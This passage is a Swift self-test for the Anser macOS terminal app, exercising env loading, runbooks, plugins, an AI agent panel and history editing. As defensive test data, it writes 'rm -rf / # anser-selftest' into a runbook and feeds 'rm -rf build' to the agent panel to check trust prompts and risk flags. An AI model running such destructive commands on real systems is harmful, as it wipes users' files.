import AppKit
import GhosttyKit
import AnserCore

/// End-to-end check of the live app, for development:
///   ANSER_SELFTEST=/tmp/out.txt build/Anser.app/Contents/MacOS/Anser
/// Drives a real pane through the same code paths as typing and clicking,
/// writes PASS/FAIL lines, then quits. Its commands are removed from history.
enum SelfTest {
    private static var lines: [String] = []
    private static var out = ""

    static func runIfRequested() {
        guard let path = ProcessInfo.processInfo.environment["ANSER_SELFTEST"] else { return }
        out = path
        guard let pane = AppDelegate.shared.currentPane, let wc = pane.windowController else {
            check("window opened", false); finish(); return
        }
        if ProcessInfo.processInfo.environment["ANSER_SELFTEST_ONLY"] == "history" {
            Task { @MainActor in await historyShots(pane); finish() }
            return
        }
        Task { @MainActor in await run(pane, wc); finish() }
    }

    /// A real screenshot of a window (what people see, unlike cacheDisplay).
    @MainActor
    static func windowShot(_ w: NSWindow?, _ name: String) async {
        guard let w else { return }
        w.displayIfNeeded()
        await sleep(0.4)
        let path = shotDir + "/\(name).png"
        for attempt in 0..<3 {
            if attempt > 0 { await sleep(0.8) }
            let p = Process()
            p.executableURL = URL(fileURLWithPath: "/usr/sbin/screencapture")
            p.arguments = ["-x", "-o", "-l\(w.windowNumber)", path]
            try? p.run()
            p.waitUntilExit()
            if FileManager.default.fileExists(atPath: path) { return }
        }
    }

    /// History window screenshots on a realistic throwaway history.
    @MainActor
    static func historyShots(_ pane: PaneView) async {
        let dir = NSTemporaryDirectory() + "anser-st-history"
        try? FileManager.default.createDirectory(atPath: dir, withIntermediateDirectories: true)
        let hpath = dir + "/shots.sqlite"
        for sfx in ["", "-wal", "-shm"] { try? FileManager.default.removeItem(atPath: hpath + sfx) }
        let hs = HistoryStore(path: hpath)
        let home = NSHomeDirectory()
        let folders = [home + "/dev-library/anser", home + "/dev-library/reqorb", home + "/dev-library/captode", home]
        let cmds: [(String, Int, Int, Int)] = [  // command, runs, folder, failures
            ("git status", 120, 0, 0), ("swift build", 45, 0, 6), ("bash scripts/build-app.sh debug", 30, 0, 2), ("swift test", 25, 0, 3),
            ("npm run dev", 40, 1, 1), ("npm test", 22, 1, 4), ("git push", 18, 1, 1), ("git commit -m \"wip\"", 15, 1, 0),
            ("ls -la", 60, 3, 0), ("pwd", 12, 3, 0), ("gti status", 2, 0, 2), ("sl", 1, 3, 1), ("npm run biuld", 1, 1, 1),
            ("docker compose up -d", 9, 2, 1), ("ffmpeg -i in.mov -vf scale=1280:-2 out.mp4", 4, 2, 0), ("open .", 14, 2, 0),
            ("git log --oneline --graph -20", 11, 0, 0), ("cd ~/dev-library", 30, 3, 0), ("brew upgrade", 3, 3, 1), ("kubectl get pods -A", 2, 3, 2),
        ]
        var day = 0.0
        for (c, runs, f, fails) in cmds {
            for i in 0..<runs {
                let at = Date().addingTimeInterval(-Double(i) * 86400 * 0.7 - day)
                let id = hs.recordStart(command: c, cwd: folders[f], session: "st", branch: f < 2 ? "main" : nil, at: at)
                hs.recordFinish(id: id, exitCode: i < fails ? (["gti status", "sl"].contains(c) ? 127 : 1) : 0, duration: Double(c.count % 7) + 0.4)
                if i == 0 { hs.saveOutput("line one of output\nline two\n" + (fails > 0 ? "error: something failed" : "done"), forHistoryID: id) }
            }
            day += 1800
        }
        let he = HistoryEditorWindowController.shared
        he.storeOverride = hs
        he.window?.setContentSize(NSSize(width: 900, height: 680))
        he.show(for: pane)
        _ = await wait(8) { he.all.count == cmds.count }
        await sleep(0.5)
        await windowShot(he.window, "history-none")
        he.select(where: { $0.c.command == "swift build" }, add: false)
        await windowShot(he.window, "history-one")
        he.select(where: { $0.c.command == "npm test" }, add: false)
        if let sv = he.insights.subviews.first as? NSScrollView, let doc = sv.documentView { doc.scroll(NSPoint(x: 0, y: 260)) }
        await windowShot(he.window, "history-one-scrolled")
        he.select(where: { $0.c.command.hasPrefix("npm") }, add: false)
        await windowShot(he.window, "history-several")
        he.setFilterForTests(.mistakes)
        await windowShot(he.window, "history-mistakes")
        check("history shots taken", FileManager.default.fileExists(atPath: shotDir + "/history-none.png"))
        he.close()
        he.storeOverride = nil
    }

    private static func check(_ name: String, _ ok: Bool, _ detail: String = "") {
        lines.append("\(ok ? "PASS" : "FAIL")  \(name)\(detail.isEmpty ? "" : "  — \(detail)")")
        // Memory: the highest seen since the previous check (memory.txt next to the results).
        memoryLog.append(String(format: "%5.0f MB peak · %5.0f MB now   %@", Double(memorySampler.takePeak()) / 1_048_576,
                                Double(MemoryUse.footprint().current) / 1_048_576, name))
    }
    private static var memoryLog: [String] = []
    private static let memorySampler = MemorySampler()

    private static func finish() {
        // Keep the user's history clean.
        let h = Services.shared.history
        for c in h.search("", scope: .all, limit: 100000).map(\.0.command)
        where c.contains("anser-selftest") || c.contains("ANSER_SELFTEST") {
            h.delete(command: c)
        }
        // End the test's shells (its own helper, never yours): the script may stop the app before it quits normally.
        if ProcessInfo.processInfo.environment["ANSER_SELFTEST_HOLD"] == nil { SessionHost.shared.request(["cmd": "endAll"], timeout: 1) }
        try? memoryLog.joined(separator: "\n").write(toFile: (out as NSString).deletingLastPathComponent + "/memory.txt", atomically: true, encoding: .utf8)
        try? lines.joined(separator: "\n").appending("\n").write(toFile: out, atomically: true, encoding: .utf8)
        // ANSER_SELFTEST_HOLD keeps the app open afterwards, for inspecting memory.
        if ProcessInfo.processInfo.environment["ANSER_SELFTEST_HOLD"] != nil { return }
        NSApp.terminate(nil)
    }

    @MainActor
    private static func wait(_ timeout: Double, _ cond: () -> Bool) async -> Bool {
        let start = Date()
        while !cond() {
            if Date().timeIntervalSince(start) > timeout { return false }
            try? await Task.sleep(nanoseconds: 50_000_000)
        }
        return true
    }

    /// Folder for UI snapshots, next to the results file.
    static var shotDir: String { (out as NSString).deletingLastPathComponent }

    @MainActor
    static func snap(_ pane: PaneView, _ name: String, full: Bool = false) {
        pane.snapshotBar(to: shotDir + "/bar-\(name).png", includeTerminalArea: full)
    }

    static func allSubviews(_ v: NSView) -> [NSView] { v.subviews + v.subviews.flatMap(allSubviews) }

    @MainActor
    static func snapView(_ v: NSView, _ name: String) {
        v.layoutSubtreeIfNeeded()
        guard let rep = v.bitmapImageRepForCachingDisplay(in: v.bounds) else { return }
        v.cacheDisplay(in: v.bounds, to: rep)
        try? rep.representation(using: .png, properties: [:])?.write(to: URL(fileURLWithPath: shotDir + "/\(name).png"))
    }

    @MainActor
    private static func sleep(_ s: Double) async { try? await Task.sleep(nanoseconds: UInt64(s * 1e9)) }

    /// Types text into the editor the way keystrokes do.
    @MainActor
    private static func type(_ pane: PaneView, _ text: String) {
        pane.window?.makeFirstResponder(pane.editor)
        for ch in text { pane.editor.insertText(String(ch), replacementRange: pane.editor.selectedRange()) }
    }

    // MARK: Newer feature checks (separate functions keep the compiler fast)

    @MainActor
    private static func workToolChecks(_ pane: PaneView, _ wc: TerminalWindowController, live: String, tmp: String) async {
        let s = pane.session
        var ok = false
        // Work tools: failed tests, "when done", file watching, project env, runbooks, containers, AI tasks, project plugins.
        FileTrust.testDefaults = UserDefaults(suiteName: "anser-selftest-trust-\(UUID().uuidString)")
        ProjectEnvPrefs.file = URL(fileURLWithPath: live + "/project-env.json")
        let wt = live + "/work"
        let fm = FileManager.default
        try? fm.removeItem(atPath: wt)
        try? fm.createDirectory(atPath: wt + "/anser-selftest/tests", withIntermediateDirectories: true)
        try? fm.createDirectory(atPath: wt + "/.git", withIntermediateDirectories: true)
        try? fm.createDirectory(atPath: wt + "/tests", withIntermediateDirectories: true)
        try? (Array(repeating: "x = 1", count: 10).joined(separator: "\n") + "\n").write(toFile: wt + "/tests/test_x.py", atomically: true, encoding: .utf8)
        try? """
        #!/bin/sh
        if [ "$1" != "-q" ]; then echo "1 passed"; exit 0; fi
        echo "=================== FAILURES ==================="
        echo "___________________ test_add ___________________"
        echo "tests/test_x.py:7: AssertionError"
        echo "FAILED tests/test_x.py::test_add - assert 3 == 4"
        exit 1
        """.write(toFile: wt + "/anser-selftest/pytest", atomically: true, encoding: .utf8)
        chmod(wt + "/anser-selftest/pytest", 0o755)
        try? "ST_FOO=from-dotenv\nPATH=/nope\n".write(toFile: wt + "/.env", atomically: true, encoding: .utf8)
        pane.run("cd \(ShellLexer.escape(wt)) # anser-selftest")
        _ = await wait(5) { s.atPrompt && s.cwd.hasSuffix("/work") }
        await sleep(0.4)

        // Project environment: offered on cd, loaded silently, unloaded on leaving.
        check("the shell can load project environments", s.capabilities.contains("load"), s.capabilities.joined(separator: ","))
        ok = await wait(3) { pane.envOffer?.dotenvFiles == [".env"] }
        pane.refreshBar()
        check("a project's .env is offered on cd", ok && pane.envChip.text.contains(".env"), pane.envChip.text)
        if let offer = pane.envOffer { pane.loadProjectEnv(offer) }
        _ = await wait(3) { pane.envLoaded != nil }
        await sleep(0.4)
        pane.run("printf '%s|%s' \"$ST_FOO\" \"$PATH\" > env.out # anser-selftest")
        ok = await wait(6) { ((try? String(contentsOfFile: wt + "/env.out", encoding: .utf8)) ?? "").hasPrefix("from-dotenv|") }
        let envOut = (try? String(contentsOfFile: wt + "/env.out", encoding: .utf8)) ?? ""
        check("loading a .env sets its values without typing a command", ok && !s.blocks.contains { $0.command.contains("ST_FOO=") }, envOut)
        check("a .env can't change PATH", !envOut.contains("/nope"))
        pane.run("cd .. # anser-selftest")
        _ = await wait(5) { s.atPrompt && !s.cwd.hasSuffix("/work") }
        ok = await wait(3) { pane.envLoaded == nil }
        await sleep(0.4)
        pane.run("printf '[%s]' \"$ST_FOO\" > \(ShellLexer.escape(wt))/env2.out # anser-selftest")
        _ = await wait(6) { fm.fileExists(atPath: wt + "/env2.out") }
        check("leaving the project unloads its values", ok && ((try? String(contentsOfFile: wt + "/env2.out", encoding: .utf8)) ?? "") == "[]",
              (try? String(contentsOfFile: wt + "/env2.out", encoding: .utf8)) ?? "none")
        ProjectEnvPrefs.set(wt, "never")
        pane.run("cd \(ShellLexer.escape(wt)) # anser-selftest")
        _ = await wait(5) { s.atPrompt && s.cwd.hasSuffix("/work") }
        await sleep(0.3)
        check("“don't offer here” is remembered", pane.envOffer == nil && pane.envLoaded == nil)

        // Failed tests: listed after a failing run, opened at the line, re-run until they pass.
        pane.run("./anser-selftest/pytest -q")
        ok = await wait(8) { pane.testReport?.report.failures.count == 1 }
        pane.refreshBar()
        check("failed tests are listed after a test run", ok && pane.testsChip.text == "1 test failed", pane.testsChip.text)
        if let (r, cmd, cwd) = pane.testReport, let f = r.failures.first {
            let re = TestFailures.rerunCommand(f, runner: r.runner, original: cmd) ?? ""
            check("a failed test can be re-run on its own", re == "./anser-selftest/pytest tests/test_x.py::test_add", re)
            pane.openTestLocation(f, cwd: cwd)
            check("a failed test opens at its line", pane.lastOpenedLink?.path.hasSuffix("tests/test_x.py") == true && pane.lastOpenedLink?.line == 7,
                  "\(String(describing: pane.lastOpenedLink))")
            check("the failed tests menu lists them", pane.failedTestsMenu()?.items.contains { $0.title == "test_add" } == true)
            pane.rerunTests([f], command: re, cwd: cwd)
            ok = await wait(8) { pane.testReport == nil }
            check("re-running a fixed test clears the list", ok)
        } else {
            check("a failed test can be re-run on its own", false, "no report")
        }

        // When this finishes: run next, but only if it worked.
        pane.run("sleep 1 # anser-selftest")
        _ = await wait(3) { s.running != nil }
        pane.afterSteps = [.run("echo after-ran # anser-selftest", onlyIfSucceeded: true)]
        pane.refreshBar()
        check("the next command shows while one runs", pane.afterChip.text.contains("after-ran"), pane.afterChip.text)
        ok = await wait(8) { s.atPrompt && s.blocks.last?.command.contains("after-ran") == true }
        check("a command can run when the current one finishes", ok)
        pane.run("sleep 0.5; false # anser-selftest")
        _ = await wait(3) { s.running != nil }
        pane.afterSteps = [.run("echo should-not-run # anser-selftest", onlyIfSucceeded: true)]
        _ = await wait(6) { s.atPrompt && s.blocks.last?.command.contains("false") == true }
        await sleep(0.6)
        check("“if it succeeds” doesn't run after a failure", !s.blocks.contains { $0.command.contains("should-not-run") } && pane.afterSteps.isEmpty)

        // Re-run when files change (not for build output or dependencies).
        pane.run("echo watch-ran # anser-selftest")
        _ = await wait(5) { s.atPrompt && s.blocks.last?.command.contains("watch-ran") == true }
        pane.toggleWatch()
        check("watching starts for the last command", pane.fileWatch?.command.contains("watch-ran") == true && pane.watchChip.text.contains("watching"))
        await sleep(0.8)
        let watchBefore = s.blocks.filter { $0.command.contains("watch-ran") }.count
        try? "changed".write(toFile: wt + "/src-file.txt", atomically: true, encoding: .utf8)
        ok = await wait(8) { s.atPrompt && s.blocks.filter { $0.command.contains("watch-ran") }.count == watchBefore + 1 }
        check("a file change re-runs the watched command", ok && pane.fileWatch?.runs == 1, "runs=\(pane.fileWatch?.runs ?? -1)")
        await sleep(1.2)
        try? fm.createDirectory(atPath: wt + "/node_modules", withIntermediateDirectories: true)
        try? "x".write(toFile: wt + "/node_modules/dep.js", atomically: true, encoding: .utf8)
        await sleep(1.5)
        check("changes in node_modules don't trigger a run", pane.fileWatch?.runs == 1)
        pane.stopWatching()
        check("watching stops", pane.fileWatch == nil && pane.watchChip.text.isEmpty)

        // Runbooks: steps run one by one and are ticked off; untrusted project runbooks ask first.
        try? fm.createDirectory(atPath: wt + "/.anser/runbooks", withIntermediateDirectories: true)
        try? """
        # St runbook

        ## One
        ```sh
        echo rb-one # anser-selftest
        ```

        ## Two
        ```sh
        echo rb-{{word:two}} # anser-selftest
        ```

        ## Three
        ```sh
        false # anser-selftest
        ```
        """.write(toFile: wt + "/.anser/runbooks/st.md", atomically: true, encoding: .utf8)
        let rbs = Runbook.load(cwd: wt)
        check("project runbooks are found", rbs.first?.title == "St runbook" && rbs.first?.steps.count == 3 && rbs.first?.source == .project)
        if let rb = rbs.first {
            check("a project runbook starts untrusted", !FileTrust.runbooks.isTrusted(rb))
            FileTrust.runbooks.trust(rb)
            let rw = RunbookWindowController.show(rb, pane: pane)
            rw?.run(step: 0)
            ok = await wait(8) { if case .ok = rw?.states[0] { return true } else { return false } }
            check("a runbook step runs and is ticked off", ok, "\(String(describing: rw?.states))")
            rw?.run(step: 2)
            ok = await wait(8) { if case .failed = rw?.states[2] { return true } else { return false } }
            check("a failing runbook step is marked failed", ok, "\(String(describing: rw?.states))")
            check("the next step is the first one not done", rw?.nextStep == 1)
            rw?.close()
            try? "# changed\n```sh\nrm -rf / # anser-selftest\n```\n".write(toFile: wt + "/.anser/runbooks/st.md", atomically: true, encoding: .utf8)
            check("changing a project runbook asks for trust again", Runbook.load(cwd: wt).first.map { !FileTrust.runbooks.isTrusted($0) } == true)
        }
        let panelWasOpen = wc.notebookPanelVisible
        if !panelWasOpen { wc.toggleNotebookPanel() }
        wc.notebookPanel.reload()
        let runbooksInPanel: Int = wc.notebookPanel.runbookCount
        check("runbooks show in the Saved panel", runbooksInPanel >= 1, "\(runbooksInPanel)")
        if !panelWasOpen { wc.toggleNotebookPanel() }

        // Containers in the sidebar (test data instead of Docker).
        ContainerMonitor.shared.testContainers = [Containers.Container(id: "1", name: "st-db", image: "postgres", status: "Up 1 minute", state: "running", ports: "0.0.0.0:5432->5432/tcp")]
        wc.sidebar.refresh(for: pane)
        ok = await wait(4) { wc.sidebar.sectionTitles.contains("CONTAINERS · 1") }
        check("running containers show in the sidebar", ok, wc.sidebar.sectionTitles.joined(separator: ", "))
        ContainerMonitor.shared.testContainers = nil

        // A tunnel to a host that doesn't exist fails and says so (and is retried a few times first).
        let badTunnel = SSHTunnel(name: "st", host: "anser-selftest.invalid", localPort: 47999, remotePort: 22)
        TunnelManager.shared.start(badTunnel)
        ok = await wait(8) {
            switch TunnelManager.shared.state(badTunnel) { case .retrying, .failed: return true; default: return false }
        }
        check("a broken tunnel reports why", ok, "\(TunnelManager.shared.state(badTunnel))")
        TunnelManager.shared.stop(badTunnel)
        check("uploads are only offered in ssh tabs", !pane.offerUpload([wt + "/env.out"]))

        // AI task: a proposed command waits for you, runs, and its result goes back for the next step.
        let doneJSON = #"{"content":[{"type":"text","text":"DONE: Printed the greeting."}],"stop_reason":"end_turn","model":"test"}"#
        Services.shared.aiOverride = AIHelp(apiKey: { "test" }, transport: { _ in (200, Data(doneJSON.utf8)) })
        AgentPanel.show(for: pane)
        if let ap = AgentPanel.forTests(pane) {
            ap.setGoalForTests("print a greeting")
            ap.received(.run(command: "rm -rf build # anser-selftest", why: "clean"))
            check("a risky AI step is flagged", ap.riskText?.contains("deletes") == true)
            ap.received(.run(command: "echo agent-step # anser-selftest", why: "Say hello."))
            check("the AI's command waits for approval", ap.proposedCommand.contains("agent-step") && !s.blocks.contains { $0.command.contains("agent-step") })
            ap.runTapped()
            ok = await wait(10) { ap.transcriptText.contains("Done: Printed the greeting.") }
            check("after a step runs, the AI gets its result and finishes", ok && s.blocks.last?.command.contains("agent-step") == true, ap.transcriptText)
            ap.close()
        } else {
            check("the AI task panel opens", false)
        }
        Services.shared.aiOverride = nil

        // Project plugins (trusted first), plugin settings, starter plugins.
        let teamDir = wt + "/.anser/plugins/team"
        try? fm.createDirectory(atPath: teamDir, withIntermediateDirectories: true)
        try? """
        {"name": "Team", "chips": [{"id": "greet", "script": "echo \\"team-$ANSER_SETTING_GREETING\\""}],
         "settings": [{"key": "greeting", "title": "Greeting", "default": "default"}]}
        """.write(toFile: teamDir + "/plugin.json", atomically: true, encoding: .utf8)
        PluginHost.shared.reload()
        pane.refreshBar()
        check("a repo's plugins wait for trust", PluginHost.shared.untrusted(for: pane).count == 1 && pane.pluginChipViews.contains { $0.text == "1 project plugin" },
              pane.pluginChipViews.map(\.text).joined(separator: ","))
        if let tp = PluginHost.shared.untrusted(for: pane).first { FileTrust.plugins.trust(tp) }
        PluginHost.shared.settingsOverride = ["project:" + teamDir: ["greeting": "from-settings"]]
        PluginHost.shared.reload()
        ok = await wait(6) { PluginHost.shared.chips(for: pane).contains { $0.chip.text == "team-from-settings" } }
        check("a trusted project plugin runs, with its settings", ok, PluginHost.shared.chips(for: pane).map(\.chip.text).joined(separator: ","))
        PluginHost.shared.settingsOverride = nil
        let starterDir = live + "/starter-plugins"
        try? fm.removeItem(atPath: starterDir)
        PluginHost.directory = starterDir
        PluginHost.shared.enabledOverride = []
        if let node = PluginGallery.items.first(where: { $0.id == "node-version" }) { PluginHost.shared.installStarter(node) }
        check("a starter plugin installs and turns on", PluginHost.shared.plugins.map(\.id) == ["node-version"] && PluginHost.shared.enabledIDs == ["node-version"])
        PluginHost.shared.enabledOverride = nil
        PluginHost.directory = PluginRegistry.defaultDirectory
        PluginHost.shared.reload()
        FileTrust.testDefaults = nil
        pane.run("cd \(ShellLexer.escape(tmp)) # anser-selftest")
        _ = await wait(5) { s.atPrompt }

        _ = ok
    }

    @MainActor
    private static func habitChecks(_ pane: PaneView, _ wc: TerminalWindowController, live: String, tmp: String) async {
        let s = pane.session
        var ok = false
        // Aliases: added in Anser, live in an open tab, removed again; habit tips; log viewer; recording a tab.
        let hab = live + "/habits"
        try? FileManager.default.removeItem(atPath: hab)
        try? FileManager.default.createDirectory(atPath: hab, withIntermediateDirectories: true)
        AliasManager.fileURL = URL(fileURLWithPath: hab + "/aliases.json")
        RecordingStore.directory = URL(fileURLWithPath: hab + "/recordings")
        pane.run("cd \(ShellLexer.escape(hab)) # anser-selftest")
        _ = await wait(5) { s.atPrompt && s.cwd.hasSuffix("/habits") }
        var book = AliasBook()
        book.set(AnserAlias(name: "anserst", command: "echo alias-works-anser-selftest"))
        check("an alias saves", AliasManager.save(book) && FileManager.default.fileExists(atPath: hab + "/aliases.sh"))
        await sleep(0.4)
        pane.run("anserst > alias.out # anser-selftest")
        ok = await wait(6) { ((try? String(contentsOfFile: hab + "/alias.out", encoding: .utf8)) ?? "").contains("alias-works") }
        check("a new alias works in an open tab right away", ok)
        AliasesWindowController.shared.show(for: pane)
        check("the alias manager lists it", AliasesWindowController.shared.rows.contains { if case let .mine(a) = $0 { return a.name == "anserst" } else { return false } })
        AliasesWindowController.shared.close()
        pane.run("echo alias-works-anser-selftest")
        ok = await wait(6) { pane.aliasTip?.existing == true }
        pane.refreshBar()
        check("typing an alias's full command shows a tip", ok && pane.aliasChip.text.contains("anserst"), pane.aliasChip.text)
        book.remove("anserst")
        AliasManager.save(book)
        await sleep(0.4)
        pane.run("type anserst >/dev/null 2>&1 || echo gone > alias2.out # anser-selftest")
        ok = await wait(6) { FileManager.default.fileExists(atPath: hab + "/alias2.out") }
        check("a deleted alias is gone from open tabs", ok)
        check("alias names are checked", AliasStore.problem(name: "rm -rf", command: "x") != nil)

        // Log viewer: levels, filters, errors.
        pane.run("printf '%s\\n' 'INFO server start' '{\"level\":\"error\",\"msg\":\"db down\",\"code\":5}' 'WARN slow query' '    at frame one' # anser-selftest")
        _ = await wait(6) { s.atPrompt && s.blocks.last?.command.contains("server start") == true }
        await sleep(0.6)
        pane.openLogViewer()
        if let lv = LogViewerWindowController.forTests(pane) {
            lv.poll()
            check("the log viewer reads levels", lv.lines.count == 4 && lv.errorCount == 1, "\(lv.lines.map { "\($0.level.label):\($0.message)" })")
            lv.setFilterForTests(level: 3, search: "")
            check("the log viewer can show only errors (with the lines that follow them)", lv.shownText.contains("db down") && !lv.shownText.contains("server start"), lv.shownText)
            lv.setFilterForTests(level: 0, search: "slow")
            check("the log viewer searches", lv.shownText.contains("slow query") && !lv.shownText.contains("db down"))
            lv.close()
        } else {
            check("the log viewer opens", false)
        }
        pane.run("tail -f /dev/null # anser-selftest")
        _ = await wait(4) { s.running != nil }
        pane.refreshBar()
        check("following a log offers the log view", pane.logChip.text == "Log view", pane.logChip.text)
        pane.sendControl("c")
        _ = await wait(5) { s.atPrompt }

        // Recording a tab and replaying it.
        pane.startRecording()
        pane.refreshBar()
        check("recording shows in the status row", pane.recChip.text.hasPrefix("REC"))
        pane.run("echo rec-demo-$((40+2)) # anser-selftest")
        _ = await wait(6) { s.atPrompt && s.blocks.last?.command.contains("rec-demo") == true }
        await sleep(0.6)
        let recURL = pane.stopRecording()
        let rec = recURL.flatMap { try? TabRecording.decode(Data(contentsOf: $0)) }
        check("a recording is saved with its frames and commands", (rec?.frames.count ?? 0) > 1 && rec?.marks.contains { $0.label.contains("rec-demo") } == true,
              "frames=\(rec?.frames.count ?? -1) marks=\(rec?.marks.map(\.label) ?? [])")
        if let rw = ReplayWindowController.forTests() {
            rw.seek(to: rw.recording.duration)
            check("the replay shows the recorded screen", rw.screenText.contains("rec-demo-42"))
            rw.close()
        } else {
            check("the replay window opens", false)
        }
        check("a recording exports for asciinema", rec.map { $0.asciicast().contains("\"version\":2") } == true)
        pane.run("cd \(ShellLexer.escape(tmp)) # anser-selftest")
        _ = await wait(5) { s.atPrompt }

        // History editor: on a throwaway history, never your real one.
        let hpath = live + "/edit-history.sqlite"
        for sfx in ["", "-wal", "-shm"] { try? FileManager.default.removeItem(atPath: hpath + sfx) }
        let hs = HistoryStore(path: hpath)
        for i in 0..<12 { hs.recordStart(command: "git status --short", cwd: tmp, session: "st", at: Date().addingTimeInterval(Double(-i))) }
        let typoID = hs.recordStart(command: "gti status", cwd: tmp, session: "st")
        hs.recordFinish(id: typoID, exitCode: 127, duration: 0.01)
        hs.recordStart(command: "sl -la", cwd: tmp, session: "st")
        hs.recordStart(command: "pwd", cwd: tmp, session: "st")
        let he = HistoryEditorWindowController.shared
        he.storeOverride = hs
        he.show(for: pane)
        ok = await wait(8) { he.all.count == 4 }
        check("the history editor lists every command", ok, "\(he.all.count)")
        he.selectMistakesTapped()
        let picked: Set<String> = Set(he.selectedCommands)
        check("Select Mistakes picks the typos", picked == Set(["gti status", "sl -la"]), he.selectedCommands.joined(separator: ", "))
        he.selectBasicTapped()
        check("Select Basic picks commands like pwd", he.selectedCommands == ["pwd"], he.selectedCommands.joined(separator: ", "))
        he.selectMistakesTapped()
        he.delete(he.selectedCommands)
        let typoGone: Bool = hs.stats(for: "gti status") == nil
        let typo2Gone: Bool = hs.stats(for: "sl -la") == nil
        let leftCount: Int = he.all.count
        check("several commands delete at once", leftCount == 2 && typoGone && typo2Gone)
        var compacted: HistoryStore.CompactResult?
        he.compact(.init(keepRunsPerCommand: 3)) { compacted = $0 }
        ok = await wait(8) { compacted != nil }
        let keptRuns: Int = hs.stats(for: "git status --short")?.count ?? -1
        let removedRuns: Int = compacted?.runsRemoved ?? -1
        check("compacting trims old runs", ok && keptRuns == 3 && removedRuns == 9, "kept=\(keptRuns) removed=\(removedRuns)")
        he.close()
        he.storeOverride = nil

        _ = ok
    }

    @MainActor
    private static func moreToolChecks(_ pane: PaneView, _ wc: TerminalWindowController, live: String, tmp: String) async {
        let s = pane.session
        var ok = false
        let fm = FileManager.default
        let dir = live + "/more"
        try? fm.removeItem(atPath: dir)
        try? fm.createDirectory(atPath: dir, withIntermediateDirectories: true)
        pane.run("cd \(ShellLexer.escape(dir)) # anser-selftest")
        _ = await wait(5) { s.atPrompt && s.cwd.hasSuffix("/more") }

        // "Last time this failed, you ran…"
        for c in ["test -f fixed.flag # anser-selftest", "touch fixed.flag # anser-selftest", "test -f fixed.flag # anser-selftest",
                  "rm fixed.flag # anser-selftest", "test -f fixed.flag # anser-selftest"] {
            pane.run(c)
            let n = s.blocks.count
            _ = await wait(5) { s.atPrompt && s.blocks.count > n - 1 && s.blocks.last?.command == c }
            await sleep(0.3)
        }
        ok = await wait(5) { pane.fixHint != nil }
        pane.refreshBar()
        let hintSteps: [String] = pane.fixHint?.steps ?? []
        check("a repeated failure shows what fixed it last time", ok && hintSteps == ["touch fixed.flag # anser-selftest"] && pane.hintChip.text.hasPrefix("Last time"),
              hintSteps.joined(separator: " | "))

        // Watching a command's output in the background.
        OutputWatchManager.shared.notify = false
        try? "one".write(toFile: dir + "/counter.txt", atomically: true, encoding: .utf8)
        let ow = OutputWatchManager.shared.add(command: "cat counter.txt", cwd: dir, env: s.env, minutes: 60)
        ok = await wait(6) { OutputWatchManager.shared.watches.first { $0.id == ow.id }?.runs == 1 }
        try? "two".write(toFile: dir + "/counter.txt", atomically: true, encoding: .utf8)
        var event: OutputWatch.Event?
        OutputWatchManager.shared.run(ow.id) { event = $0 }
        _ = await wait(6) { event != nil }
        check("a watched command notices changed output", ok && event == .changed, "\(String(describing: event))")
        wc.sidebar.refresh(for: pane)
        ok = await wait(4) { wc.sidebar.sectionTitles.contains { $0.hasPrefix("WATCHING") } }
        check("watched commands show in the sidebar", ok)
        OutputWatchManager.shared.remove(ow.id)

        // Running on several hosts (a local stand-in for ssh).
        let mh = MultiHostWindowController.shared
        mh.argvOverride = { host, _ in ["/bin/sh", "-c", host == "st-bad" ? "echo broken; exit 2" : "echo hello-\(host)"] }
        mh.show()
        mh.setChecked(["st-a", "st-bad"])
        var mhDone = false
        mh.run("uptime", on: ["st-a", "st-bad"]) { mhDone = true }
        _ = await wait(8) { mhDone }
        let mhSummary = MultiHost.summary(Array(mh.results.values))
        check("one command runs on several hosts, failures first", mhDone && mhSummary == "1 ok · 1 failed" && mh.order.first == "st-bad", mhSummary)
        mh.argvOverride = nil
        mh.close()

        // AI ghost text from a local model (answered by the test).
        CommandEditor.aiTransportForTests = { _ in (200, Data(#"{"response":"echo anser-ai-ghost-ok"}"#.utf8)) }
        SettingsWindowController.setValue(["aiCompletions"], true)
        SettingsWindowController.setValue(["aiProvider"], "ollama")
        _ = await wait(5) { Services.shared.config.aiCompletions && Services.shared.config.aiProvider == "ollama" }
        pane.editor.setTextForTests("echo anser-ai-gh")
        ok = await wait(5) { pane.editor.ghostSuffix == "ost-ok" }
        check("a local AI model fills the gray text when history has none", ok, pane.editor.ghostSuffix)
        pane.editor.setTextForTests("")
        SettingsWindowController.setValue(["aiCompletions"], nil)
        SettingsWindowController.setValue(["aiProvider"], nil)
        CommandEditor.aiTransportForTests = nil

        // History: Recently Deleted, restore, weekly clean-up.
        let hpath = dir + "/h.sqlite"
        let hs = HistoryStore(path: hpath)
        hs.recordStart(command: "git status --short", cwd: tmp, session: "st")
        let typo = hs.recordStart(command: "gti status", cwd: tmp, session: "st")
        hs.recordFinish(id: typo, exitCode: 127, duration: 0)
        let he = HistoryEditorWindowController.shared
        he.storeOverride = hs
        he.show(for: pane)
        _ = await wait(6) { he.all.count == 2 }
        he.delete(["gti status"])
        he.setFilterForTests(.trash)
        let trashShown: Int = he.shown.count
        check("deleted commands wait in Recently Deleted", trashShown == 1 && hs.stats(for: "gti status") == nil)
        he.restore(["gti status"])
        ok = await wait(6) { hs.stats(for: "gti status") != nil }
        check("a deleted command can be restored", ok)
        he.setFilterForTests(.all)
        // Details, fixing a command in place, saving to the notebook.
        he.select(where: { $0.c.command == "git status --short" }, add: false)
        he.updateDetails()
        let detailText: String = he.detailsText
        check("the history editor shows a command's runs", detailText.contains("git status --short") && detailText.contains("1 run"), String(detailText.prefix(120)))
        let savedN: Int = NotebookSaver.add([(command: "git status --short", title: "St short status")], group: "St from history")
        let nb = (try? Notebook.load(from: NotebookWindow.fileURL)) ?? Notebook()
        let savedTitle: String? = nb.groups.first { $0.name == "St from history" }?.entries.first?.displayTitle
        check("a history command saves to the notebook", savedN == 1 && savedTitle == "St short status", "\(savedN) \(savedTitle ?? "none")")
        check("saving it again is skipped", NotebookSaver.add([(command: "git status --short", title: "")], group: "General") == 0)
        he.rename("git status --short", to: "git status -sb")
        ok = await wait(6) { he.all.contains { $0.c.command == "git status -sb" } }
        check("a command can be edited in history", ok && hs.stats(for: "git status --short") == nil)
        he.setFilterForTests(.folder)
        let folderRows: Int = he.shown.count
        check("the folder filter shows commands used here", folderRows == 0, "pane is in \(PathDisplay.short(s.cwd)), history in \(PathDisplay.short(tmp)): \(folderRows)")
        he.setFilterForTests(.all)
        let moved = HistoryAutoClean.runIfDue(store: hs, force: true)
        check("the weekly clean-up moves typos to Recently Deleted", moved == 1 && hs.trashed().map(\.command) == ["gti status"], "\(moved)")
        he.close()
        he.storeOverride = nil

        // Aliases: import from the shell, with groups.
